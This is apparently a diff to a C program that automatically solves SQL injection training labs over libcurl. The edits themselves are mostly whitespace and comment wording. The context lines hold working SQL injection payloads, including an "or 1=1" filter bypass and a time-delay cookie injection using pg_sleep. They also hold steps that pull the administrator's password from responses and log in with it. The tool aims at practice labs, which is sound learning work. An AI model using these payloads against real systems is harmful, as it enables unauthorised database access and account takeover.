@@ -9,6 +9,7 @@ typedef struct {
     int lab_id;
 } LabMapping;
 
+
 int extract_lab_id_from_lab_name(const char *html_content) {
     // PAAS supports the SQLi labs listed below
     LabMapping lab_mappings[] = {
@@ -46,6 +47,7 @@ int extract_lab_id_from_lab_name(const char *html_content) {
         }
 
         strncpy(lab_name, start, end - start);
+        
         lab_name[lab_name_len] = '\0';
 
         for (size_t i = 0; i < sizeof(lab_mappings) / sizeof(lab_mappings[0]); i++) {
@@ -250,7 +252,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
 
     if (lab_to_be_solved == 1) {
         // Lab name: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
-        strncat(url, "/filter?category=Accessories'+or+1+=1--", 39);
+        strncat(url, "/filter?category=Accessories'+or+1+=1--", 40);
         curl_easy_setopt(curl, CURLOPT_URL, url);
 
         performCurlRequest(curl, response_buffer, header_buffer);
@@ -391,7 +393,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
         performCurlRequest(curl, response_buffer, header_buffer);
         clear_url(url);
 
-        // extract administrator's administrator_account_password from column
+        // extract administrator's password from column
         extract_value(response_buffer, "administrator", "<", administrator_account_password, 51);
 
         // login as administrator and solve the lab
@@ -430,8 +432,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
             f++;
         }
         snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
-
-
+        
         curl_easy_setopt(curl, CURLOPT_URL, url);
 
         performCurlRequest(curl, response_buffer, header_buffer);
@@ -454,7 +455,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
         performCurlRequest(curl, response_buffer, header_buffer);
         clear_url(url);
 
-        // extract administrator's administrator_account_password from column
+        // extract administrator's password from column
         extract_value(response_buffer, "administrator", "<", administrator_account_password, 51);
 
         // login as administrator and solve the lab
@@ -532,7 +533,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
 
-        // extract administrator's administrator_account_password from column
+        // extract administrator's password from column
         extract_value(response_buffer, "administrator", "<", administrator_account_password, 51);
 
         // login as administrator and solve the lab
@@ -649,7 +650,6 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
         login_as_administrator(administrator_account_password, login_url, response_buffer, header_buffer, csrf_token, curl, post_data);
     }
     else if (lab_to_be_solved == 14) {
-        // düzeltilecek
         // Lab name: "Blind SQL injection with time delays"
         curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=paas'||pg_sleep(10)--");
         performCurlRequest(curl, response_buffer, header_buffer);
